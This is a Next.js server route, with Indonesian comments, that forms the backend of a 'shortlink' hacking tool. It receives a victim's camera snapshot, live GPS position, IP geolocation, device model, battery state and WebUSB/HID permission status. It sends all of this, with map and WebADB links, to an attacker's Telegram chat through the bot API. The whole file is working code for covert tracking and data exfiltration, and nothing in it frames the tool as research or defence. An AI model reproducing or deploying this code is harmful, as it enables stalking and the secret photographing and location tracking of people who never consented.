import { NextResponse } from "next/server";
import axios from "axios";

export async function POST(req: Request) {
  try {
    const { image, gps, device, battery, permissions } = await req.json();
    const ip = req.headers.get("x-forwarded-for") || "1.1.1.1";

    // Info Lokasi IP
    const geoRes = await axios.get(`http://ip-api.com/json/${ip.split(',')[0]}`).catch(() => ({ data: {} }));
    const geo = geoRes.data;

    let caption = `🚀 *SHORTLINK GENERATOR HACKING REPORT*\n`;
    caption += `━━━━━━━━━━━━━━━━━━━━\n\n`;
    
    // Informasi Jaringan (Klik nilai untuk copy)
    caption += `🌐 *NETWORK & GEO*\n`;
    caption += `├ *IP:* \`${geo.query || ip}\` \n`;
    caption += `├ *ISP:* \`${geo.isp || "?"}\` \n`;
    caption += `└ *Lokasi:* \`${geo.city || "?"}, ${geo.country || "?"}\` \n\n`;

    // Detail Perangkat
    caption += `📱 *DEVICE DETAILS*\n`;
    caption += `├ *Model:* \`${device.model || "Unknown"}\` \n`;
    caption += `├ *OS:* \`${device.os || "Unknown"}\` \n`;
    caption += `└ *Baterai:* \`${battery?.level || "0"}%\` (${battery?.charging ? "⚡" : "🔋"}) \n\n`;

    // Laporan Perizinan
    caption += `🛡️ *PERMISSIONS*\n`;
    caption += `├ *Kamera/Mic:* \`Detected\` \n`;
    caption += `├ *Lokasi:* \`${permissions.location ? "Granted" : "Denied"}\` \n`;
    caption += `├ *WebUSB/ADB:* \`${permissions.usb === "supported" ? "Ready" : "No Support"}\` \n`;
    caption += `└ *HID Devices:* \`${permissions.hid === "supported" ? "Ready" : "No Support"}\` \n\n`;

    if (gps) {
      caption += `🎯 *LIVE GPS*\n`;
      caption += `└ \`https://www.google.com/maps?q=${gps.lat},${gps.lon}\` \n`;
    }
    
    caption += `\n━━━━━━━━━━━━━━━━━━━━`;

    // Membuat Menu Tombol (Inline Keyboard)
    const keyboard = {
      inline_keyboard: [
        [
          { text: "📍 Buka Google Maps", url: gps ? `https://www.google.com/maps?q=${gps.lat},${gps.lon}` : "https://maps.google.com" },
        ],
        [
          { text: "🌐 Cek IP Detail", url: `https://ip-api.com/#${geo.query || ip}` },
          { text: "🛠️ Ya-WebADB", url: "https://yabb.dev/" }
        ]
      ]
    };

    const formData = new FormData();
    formData.append("chat_id", process.env.TELEGRAM_CHAT_ID!);
    
    if (image) {
      const buffer = Buffer.from(image.replace(/^data:image\/\w+;base64,/, ""), "base64");
      formData.append("photo", new Blob([buffer], { type: "image/png" }), "capture.png");
    }
    
    formData.append("caption", caption);
    formData.append("parse_mode", "Markdown");
    formData.append("reply_markup", JSON.stringify(keyboard)); // Menambahkan Menu Tombol

    await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendPhoto`, formData);

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error("Error sending to Telegram:", error);
    return NextResponse.json({ error: "Failed" }, { status: 500 });
  }
}